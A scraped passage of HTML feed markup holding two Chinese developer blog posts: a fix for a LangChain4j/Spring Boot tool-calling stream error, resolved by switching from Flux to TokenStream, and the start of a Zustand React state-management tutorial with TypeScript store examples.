                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在基于 <strong>LangChain4j + Spring Boot</strong> 开发AI代码生成平台的过程中，主要想实现Vue项目带工具调用的流式生成能力，比如自动写入项目文件、构建打包，同时通过响应式流向前端推送实时进度。</p>
<p>但是，在前端调试时，出现了以下错误：</p>
<p><strong>抱歉,生成过程中出现了错误,请重试。</strong></p>
<h3 data-id="heading-0">原因分析</h3>
<h4 data-id="heading-1">1. AI服务接口</h4>
<pre><code class="hljs language-bash" lang="bash">@SystemMessage(fromResource = <span class="hljs-string">"prompt/codegen-vue-project-system-prompt.txt"</span>)
Flux&lt;String&gt; generateVueProjectCodeStream(@MemoryId long appId, @UserMessage String userMessage);
</code></pre>
<h4 data-id="heading-2">2. Facade层调度逻辑</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-keyword">case</span> VUE_PROJECT -&gt; {
    Flux codeStream = aiCodeGeneratorService.generateVueProjectCodeStream(appId, userMessage);
    yield processCodeStream(codeStream, CodeGenTypeEnum.VUE_PROJECT, appId);
}
</code></pre>
<p>接口调用直接返回业务异常，前端无任何流式输出，日志无有效业务堆栈，仅提示：<code>抱歉，生成过程中出现了错误，请重试</code>。</p>
<p>主要原因是：</p>
<ul>
<li><code>TokenStream</code> 是LangChain4j专为<strong>AI流式响应 + 工具调用</strong>设计的API，内置 <code>onToolRequest</code>/<code>onToolExecuted</code> 等完整回调事件，可无缝衔接工具执行流程；</li>
<li><code>Flux&lt;String&gt;</code> 是通用响应式流组件，<strong>无AI场景专属能力</strong>，无法接收、处理工具调用的回调事件。</li>
</ul>
<h3 data-id="heading-3">解决方法</h3>
<p>将接口和调度层作如下修改：</p>
<pre><code class="hljs language-bash" lang="bash">// 1. AI接口原生返回值类型
@SystemMessage(fromResource = <span class="hljs-string">"prompt/codegen-vue-project-system-prompt.txt"</span>)
TokenStream generateVueProjectCodeStream(@MemoryId long appId, @UserMessage String userMessage);

// 2. Facade层调度逻辑
<span class="hljs-keyword">case</span> VUE_PROJECT -&gt; {
    TokenStream tokenStream = aiCodeGeneratorService.generateVueProjectCodeStream(appId, userMessage);
    yield processTokenStream(tokenStream);
}
</code></pre>
<p>接下来，就恢复正常了。</p>
<h3 data-id="heading-4">小贴士</h3>
<p>在集成工具调用的LangChain4j AI场景中，<code>TokenStream</code> 是官方推荐且唯一能保证全功能正常运行的流式类型，<code>Flux</code> 仅适用于无AI业务逻辑的通用流式场景。</p>
<p>在集成第三方框架时，优先使用框架原生提供的组件和API，是保证系统稳定性的最优解。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Zustand：打造 React 应用的“中央银行”级状态管理]]></title>    <link>https://juejin.cn/post/7602243150157873179</link>    <guid>https://juejin.cn/post/7602243150157873179</guid>    <pubDate>2026-02-03T05:17:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602243150157873179" data-draft-id="7602252722373328947" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Zustand：打造 React 应用的“中央银行”级状态管理"/> <meta itemprop="keywords" content="React.js,前端框架,前端工程化"/> <meta itemprop="datePublished" content="2026-02-03T05:17:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="San30"/> <meta itemprop="url" content="https://juejin.cn/user/1766294768060816"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Zustand：打造 React 应用的“中央银行”级状态管理
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1766294768060816/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    San30
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T05:17:50.000Z" title="Tue Feb 03 2026 05:17:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"「";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"」";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"✓";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><p>在 React 的开发江湖中，状态管理（State Management）始终是一个绕不开的核心话题。如果说 React 组件是构成应用社会的“个体家庭”，那么状态管理就是维持社会运转的“经济系统”。</p>
<p>对于简单的父子组件通信，<code>useState</code> 和 <code>props</code> 就像是家庭内部的现金流转，简单直接。但当应用规模扩大，多个没有任何血缘关系（非父子层级）的组件需要共享数据时，我们往往会陷入“Prop Drilling”（属性透传）的泥潭。</p>
<p>这时，我们需要一个**“中央银行”**。</p>
<p>这就是 <strong>Zustand</strong>（德语“状态”之意）。它是一个基于 Hooks 的、轻量级的、无样板代码（Boilerplate-free）的状态管理库。它比 Redux 更简单，比 Context API 更高效。</p>
<p>本文将结合实际代码案例（计数器、待办事项、用户认证），带你深入理解 Zustand 的设计哲学与实战技巧。</p>
<h2 data-id="heading-0">一、 核心概念：为什么选择 Zustand？</h2>
<p>在深入代码之前，我们需要理解 Zustand 试图解决什么问题。</p>
<blockquote>
<p><strong>“如果说国家需要有中央银行，那么前端项目就需要中央状态管理系统。”</strong></p>
</blockquote>
<h3 data-id="heading-1">1. 组件 = UI + State</h3>
<p>在现代前端架构中，UI 只是数据的投影。公式</p>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>U</mi><mi>I</mi><mo>=</mo><mi>f</mi><mo stretchy="false">(</mo><mi>S</mi><mi>t</mi><mi>a</mi><mi>t</mi><mi>e</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">UI = f(State)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">St</span><span class="mord mathnormal">a</span><span class="mord mathnormal">t</span><span class="mord mathnormal">e</span><span class="mclose">)</span></span></span></span></span></p>
<p>揭示了本质。Zustand 的作用就是将 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mi>t</mi><mi>a</mi><mi>t</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">State</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">St</span><span class="mord mathnormal">a</span><span class="mord mathnormal">t</span><span class="mord mathnormal">e</span></span></span></span></span> 从组件树中抽离出来，存入一个全局的 Store（仓库）中进行专业管理。</p>
<h3 data-id="heading-2">2. 轻量与直观</h3>
<p>Redux 强制要求你编写 Action Types、Reducers、Selectors，并使用 Provider 包裹整个应用。而 Zustand 不仅无需 Provider，其核心逻辑更是极致精简：</p>
<ul>
<li><strong>全局共享：</strong> 状态一旦创建，任何组件均可访问。</li>
<li><strong>基于 Hooks：</strong> 使用方式几乎等同于 <code>useState</code>，符合 React 直觉。</li>
<li><strong>自动合并：</strong> 默认进行浅合并（Shallow Merge），简化了更新逻辑。</li>
</ul>
<p>工程目录结构如下：</p>
<pre><code class="hljs language-Plaintext" lang="Plaintext">src/
  ├── store/           # 状态管理的“中央银行”
  │    ├── user.ts     # 负责用户身份、登录状态
  │    ├── todo.ts     # 负责业务数据流
  │    └── counter.ts  # 负责基础工具或计数逻辑
  ├── components/      # UI 组件
  └── types/           # TypeScript 类型定义
</code></pre>
<h2 data-id="heading-3">二、 起步：构建你的第一个 Store</h2>
<p>让我们通过 <code>counter.ts</code> 来看看 Zustand 是如何定义“规矩”的。</p>
<h3 data-id="heading-4">1. 定义状态契约 (TypeScript Interface)</h3>
<p>在 TypeScript 项目中，第一步永远是定义类型。这相当于为“中央银行”制定法律，规定了存储什么数据，以及允许什么操作。</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-comment">// counter.ts</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">CounterState</span> {
    <span class="hljs-attr">count</span>: <span class="hljs-built_in">number</span>;          <span class="hljs-comment">// 数据状态</span>
    <span class="hljs-attr">increment</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span>;  <span class="hljs-comment">// 修改动作：增加</span>
    <span class="hljs-attr">decrement</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span>;  <span class="hljs-comment">// 修改动作：减少</span>
    <span class="hljs-attr">reset</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span>;      <span class="hljs-comment">// 修改动作：重置</span>
}
</code></pre>
<h3 data-id="heading-5">2. 创建 Store (<code>create</code>)</h3>
<p>使用 <code>create</code> 函数构建 Store。这里有一个关键的模式：<strong>状态和修改状态的方法（Actions）是在一起定义的</strong>。这体现了高内聚的设计思想。</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-comment">// counter.ts</span>
<span class="hljs-keyword">import</span> { create } <span class="hljs-keyword">from</span> <span class="hljs-string">'zustand'</span>;
<span class="hljs-keyword">import</span> { persist } <span class="hljs-keyword">from</span> <span class="hljs-string">'zustand/middleware'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> useCounterStore = create&lt;<span class="hljs-title class_">CounterState</span>&gt;()(
    <span class="hljs-title function_">persist</span>(
        <span class="hljs-function">(<span class="hljs-params">set</span>) =&gt;</span> ({
            <span class="hljs-comment">// 1. 初始状态</span>
            <span class="hljs-attr">count</span>: <span class="hljs-number">0</span>,
            
            <span class="hljs-comment">// 2. 修改状态 (Actions)</span>
            <span class="hljs-comment">// set 函数接收当前 state，返回新的部分 state</span>
            <span class="hljs-attr">increment</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">set</span>(<span class="hljs-function">(<span class="hljs-params">state</span>) =&gt;</span> ({ <span class="hljs-attr">count</span>: state.<span class="hljs-property">count</span> + <span class="hljs-number">1</span> })),
